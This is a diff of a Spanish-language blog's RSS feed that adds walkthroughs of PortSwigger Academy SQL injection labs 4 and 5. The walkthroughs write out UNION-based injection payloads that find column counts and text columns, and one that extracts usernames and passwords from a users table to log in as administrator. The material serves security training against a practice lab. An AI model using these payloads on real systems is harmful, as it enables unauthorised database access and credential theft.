@@ -66,7 +66,7 @@
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,NULL,NULL&amp;ndash;&lt;/td&gt;
-&lt;td&gt;Imprimer resultados normalmente&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
@@ -84,10 +84,10 @@
 			height=&#34;1214&#34;
 			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto_hudec4bf4e3164bf85cecd215025d78dae_169992_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/resuelto_hudec4bf4e3164bf85cecd215025d78dae_169992_1024x0_resize_box_3.png 1024w&#34;
 			loading=&#34;lazy&#34;
-			alt=&#34;Labo resuelto&#34;&gt;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
 	&lt;/a&gt;
 	
-	&lt;figcaption&gt;Labo resuelto&lt;/figcaption&gt;
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
 	
 &lt;/figure&gt;&lt;/p&gt;
 &lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
@@ -95,6 +95,162 @@
 &lt;ol&gt;
 &lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
 &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 4</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/</link>
+        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 4" /&gt;&lt;h1 id=&#34;lab-sql-injection-union-attack-finding-a-column-containing-text&#34;&gt;Lab: SQL injection UNION attack, finding a column containing text&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es saber el tipo de datos que es utilizado en los valores que son enviadas en la consulta, ya que es necesario saber que tipo de valor son para que el sistema no genere errores al momento de extraeros, utilizaremos la informacion anterior primero enumerando el numero de columnas, y al hacer el reconocimiento sabemos que cuenta con 3 columnas ya que es la unica que no genera un error.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT NULL,NULL,NULL--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Ingresamos a la web y al acceder en mi caso me pide que imprima el valor &lt;code&gt;mO7mSy&lt;/code&gt; al recuperar los datos, asi que buscaremos que valores aceptan string para poder imprimirlo&lt;/p&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Payload&lt;/th&gt;
+&lt;th&gt;Resultado&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Pets&#39; UNION SELECT &amp;lsquo;test&amp;rsquo;,NULL,NULL&amp;ndash;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Pets&#39; UNION SELECT NULL,&amp;lsquo;test&amp;rsquo;,NULL&amp;ndash;&lt;/td&gt;
+&lt;td&gt;Imprime resultados normalmente&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Pets&#39; UNION SELECT NULL,NULL,&amp;lsquo;test&amp;rsquo;&amp;ndash;&lt;/td&gt;
+&lt;td&gt;&lt;strong&gt;Muestra error&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Nos podemos dar cuenta que la columna dos permite que se puedan ingresar datos de tipo string ahora toca ingresar la cadena que nos indican para poder resolver el lab, inyectando la consulta sql:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; UNION SELECT NULL,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;mO7mSy&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,NULL--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 142; 
+			flex-basis: 340px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto.png&#34; data-size=&#34;1758x1238&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto.png&#34;
+			width=&#34;1758&#34;
+			height=&#34;1238&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto_huec4219d55952b16f59692c854c1e5e19_171125_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/resuelto_huec4219d55952b16f59692c854c1e5e19_171125_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/section&gt;
+</description>
+        </item>
+        <item>
+        <title>Portswigger Academy Learning Path: SQL Injection Lab 5</title>
+        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/</link>
+        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/</guid>
+        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 5" /&gt;&lt;h1 id=&#34;lab-lab-sql-injection-union-attack-retrieving-data-from-other-tables&#34;&gt;Lab: Lab: SQL injection UNION attack, retrieving data from other tables&lt;/h1&gt;
+&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos de una tabla, las columnas son &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;. La idea es hacer uso del metodo union en sql para poder extraer esos datos aparte de los que ya trae el sistema. La consulta comun para recuperar estos datos seria:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
+&lt;p&gt;Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.&lt;/p&gt;
+&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
+&lt;h4 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h4&gt;
+&lt;p&gt;Recuperamos las columnas inyectando la siguiente consulta:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=PetsPets&#39; order by 4--
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;recuperar-tipo-de-datos&#34;&gt;Recuperar tipo de datos&lt;/h4&gt;
+&lt;p&gt;Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 100; 
+			flex-basis: 241px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png&#34; data-size=&#34;1781x1773&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings.png&#34;
+			width=&#34;1781&#34;
+			height=&#34;1773&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/strings_hub14488023fc5142b8e0617dac40dcbeb_519418_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Tipo de Datos aceptados&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Tipo de Datos aceptados&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h4 id=&#34;recuperar-datos-de-usuarios&#34;&gt;Recuperar datos de usuarios&lt;/h4&gt;
+&lt;p&gt;Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos la siguiente consulta:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select username,password from users--
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 100; 
+			flex-basis: 240px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png&#34; data-size=&#34;1744x1742&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido.png&#34;
+			width=&#34;1744&#34;
+			height=&#34;1742&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/extraido_hu27c916cebc82f9da26fc034f1f8e70b9_529545_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Usuarios y Contrasenas de la tabla users&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Usuarios y Contrasenas de la tabla users&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;Ahora que ya nos hicimos con los datos del administrador, podemos iniciar sesion para que el sistema ya nos tome como resuelto el lab.&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 207; 
+			flex-basis: 497px&#34;
+	&gt;
+	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png&#34; data-size=&#34;1786x862&#34;&gt;
+		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto.png&#34;
+			width=&#34;1786&#34;
+			height=&#34;862&#34;
+			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/resuelto_hu8619a3f0e8c32341800ab4c4e3a758b5_98522_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;Laboratorio resuelto&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
